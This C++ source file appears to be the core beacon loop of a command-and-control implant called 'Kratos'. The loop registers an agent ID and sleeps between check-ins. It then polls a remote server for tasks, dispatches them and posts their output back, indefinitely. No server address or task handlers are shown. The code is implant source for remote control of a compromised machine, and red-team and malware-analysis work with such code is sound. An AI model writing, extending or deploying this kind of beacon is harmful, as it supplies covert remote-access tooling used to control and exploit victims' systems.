#include "agent/core.h"
#include "packager/packager.h"
#include "net/net.h"

Kratos* kratos = NULL;





BOOL Kratos::Run( ) {

	packager->NewPacker( );
	packager->PrepareMetaData( this->AgentID );
	const INT32 RequestBase = packager->PackerSize( );

	for ( ;; ) {
		DEBUG_LOG("\n");
		this->Sleeper();
		if ( ! packager->ResetPackerIndex( RequestBase ) ) {
			return FALSE;
		}
		packager->Pack4( MSG_GETTASK );

		DEBUG_LOG("[+] Getting Task");
		if ( ! net->Post( packager->PackerPointer( ), ( SIZE_T )packager->PackerSize() ) ) {
			return FALSE;
		}

		packager->NewUnPacker( net->Data( ), net->DataSize( ) );
		INT32 TotalTasks = packager->UnPack4( );

		if ( TotalTasks == RESP_NO_TASKS ) {
			DEBUG_LOG("[+] No Task");
			continue;
		}

		if ( TotalTasks <= 0 || TotalTasks > 64 ) {
			DEBUG_LOG("[!] Invalid task count");
			continue;
		}

		if ( ! packager->ResetPackerIndex( RequestBase ) ) {
			return FALSE;
		}
		packager->Pack4( MSG_OUTPUT );
		this->Dispatch( TotalTasks );

		if ( ! net->Post( packager->PackerPointer( ), ( SIZE_T )packager->PackerSize() ) ) {
			return FALSE;
		}

	}

	return TRUE;
}



